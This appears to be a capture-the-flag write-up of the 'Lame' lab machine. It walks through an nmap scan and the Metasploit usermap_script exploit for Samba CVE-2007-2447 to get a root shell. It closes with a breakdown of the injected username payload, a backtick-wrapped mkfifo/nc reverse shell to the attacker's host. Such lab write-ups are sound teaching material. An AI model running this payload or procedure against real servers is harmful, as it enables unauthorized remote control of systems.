# Lame

In this blog, we explore the process of identifying and exploiting vulnerabilities in Samba using the CVE-2007-2447 exploit. By leveraging Metasploit, we demonstrate how to gain unauthorized access to a server through the manipulation of shell metacharacters. This post provides a detailed, step-by-step guide on executing the exploit and capturing the root flag.

Perform an `nmap` scan using the `-sV` switch. We see we get a response with multiple services up and running on the target server.

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we do some basic research, we identify some vulnerabilities relating to the Samba version running on the server.

Samba is a suite of programs that implements the Server Message Block (SMB) protocol, which includes NetBIOS over TCP/IP (NBT). SMB is a network file sharing protocol that allows computers and servers to communicate with other systems using network ports. NetBIOS is an older transport layer that allows Windows computers to communicate with each other on the same network.

For the machine, we are going to utilize CVE-2007-2447, which as defined by CVE, "allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function when the 'username map script' smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management."

Luckily, we see Metasploit already has a script to exploit this vulnerability.

Type the following commands to properly execute the Metasploit payload:

`search cve-2007-2447`

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption><p>Find Metasploit script</p></figcaption></figure>

`use exploit/multi/samba/usermap_script`

<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption><p>Use script</p></figcaption></figure>

`set rhost "Enter applicable ip address"`

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption><p>Set your host IP properly</p></figcaption></figure>

`run`

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption><p>Run script</p></figcaption></figure>

We now have successfully established a connection with the remote Samba server.

You will find the user flag in the /home/makis directory. Type `Shell` to spawn a new shell in your CMD and locate the root flag by typing `cd /root`.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Here is the Metasploit script that actually performs the exploit.

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Example Execution Flow:

* **Username Injection:**
  * When Samba processes the `username field /=nohup mkfifo /tmp/hago; nc lhost lport 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago``:`
* **Command Execution:**
  * The shell interprets the backticks and executes the command inside them.
  * `mkfifo /tmp/hago` is executed, creating a named pipe.
  * `nc lhost lport 0</tmp/hago | /bin/sh >/tmp/hago 2>&1` is executed, establishing a reverse shell connection to the attacker's machine.
  * `rm /tmp/hago` is executed, cleaning up the named pipe.
  * The backticks `` ` ` `` around `nohup " + payload + "` ensure that this string is treated as a command and executed by the shell.
  * `nohup` ensures that the command runs to completion without being interrupted by hangup signals.
  * By carefully crafting the payload and using shell metacharacters, the attacker can execute arbitrary commands on the vulnerable server, leading to a reverse shell and potentially complete control over the target system.
